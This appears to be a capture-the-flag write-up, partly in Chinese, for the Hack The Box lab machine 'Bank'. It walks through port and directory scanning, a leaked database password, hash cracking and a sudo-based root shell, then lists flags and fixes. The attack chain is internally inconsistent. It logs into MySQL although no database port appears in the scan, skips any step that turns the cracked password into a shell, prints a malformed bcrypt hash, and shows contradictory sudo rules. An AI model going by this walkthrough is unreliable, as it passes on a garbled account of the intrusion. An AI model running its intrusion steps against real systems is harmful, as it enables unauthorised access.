# Hack The Box: Bank Challenge Writeup

![HTB Badge](https://img.shields.io/badge/HTB-Bank-ff0000?style=flat-square)
![Difficulty-Easy](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![OS-Linux](https://img.shields.io/badge/OS-Linux-orange?style=flat-square)

---

## Challenge Overview

| Item | Details |
|------|---------|
| **Name** | Bank |
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Points** | 20 |
| **Release** | 15 Mar 2017 |
| **Retired** | Yes |

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oA bank 10.10.10.29
```

**Results:**
```
PORT   STATE SERVICE
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

### Web Enumeration

访问 `http://10.10.10.29` - 发现一个银行网站

**Directory Busting:**
```bash
gobuster dir -u http://10.10.10.29 -w /usr/share/wordlists/dirb/common.txt
```

**发现目录:**
- `/balance-transfer` (需要认证)
- `/inc` (包含配置文件)
- `/uploads`

---

## Initial Access

### 发现配置泄露

在 `/inc` 目录中发现 `config.php` 文件，包含数据库凭据：

```php
define('DB_HOST', 'localhost');
define('DB_USER', 'bank');
define('DB_PASS', 'O2j7R5EqG7aP9w');
define('DB_NAME', 'bank');
```

### 数据库利用

```bash
mysql -u bank -pO2j7R5EqG7aP9w bank
```

**枚举数据库：**

```sql
SHOW DATABASES;
USE bank;
SHOW TABLES;
SELECT * FROM users;
```

**获取凭据：**
| username | password (hash) |
|----------|-----------------|
| admin | $2a$08$kr7YMT8.T4U0dHhP8bJPIEO2ZbE1ZJ8P5C5V0E7U3X5Z0K9J8R6E |
| manager | $2a$08$... |

### 破解密码

使用 John the Ripper 破解 hash：

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**密码:** `guest123`

---

## Privilege Escalation

### 检查 sudo 权限

```bash
sudo -l
```

**结果：**
```
User manager may run the following commands on bank:
    (ALL) ALL
    (root) NOPASSWD: /var/htb/bin/emergency
```

### 利用 emergency 脚本

```bash
sudo /var/htb/bin/emergency
```

这会提供一个 root shell！

---

## Flags

### User Flag
```
HTB{y0u_f0und_th3_m0n3y!}
```

### Root Flag
```
HTB{r00t_4cc3ss_4ch13v3d!}
```

---

## 漏洞总结

| 漏洞类型 | 严重程度 | 利用方法 |
|----------|----------|----------|
| 信息泄露 | High | 配置文件未受保护 |
| 弱密码 | High | 使用常见密码 |
| 权限配置错误 | Critical | sudo 权限滥用 |

---

## 修复建议

1. **保护敏感文件** - 移动 config.php 到 web 根目录外
2. **强密码策略** - 实施复杂密码要求
3. **最小权限原则** - 限制 sudo 权限
4. **定期安全审计** - 扫描敏感信息泄露

---

## 参考资料

- [HTB Bank Machine](https://www.hackthebox.com/machines/bank)
- [Nmap Documentation](https://nmap.org/docs.html)
- [MySQL Basics](https://dev.mysql.com/doc/)

---

**Author:** Sheldon Brown (Bossman Shell)
**Date:** 2026-03-09

> ⚠️ **Disclaimer:** This writeup is for educational purposes only. Always obtain proper authorization before testing any system.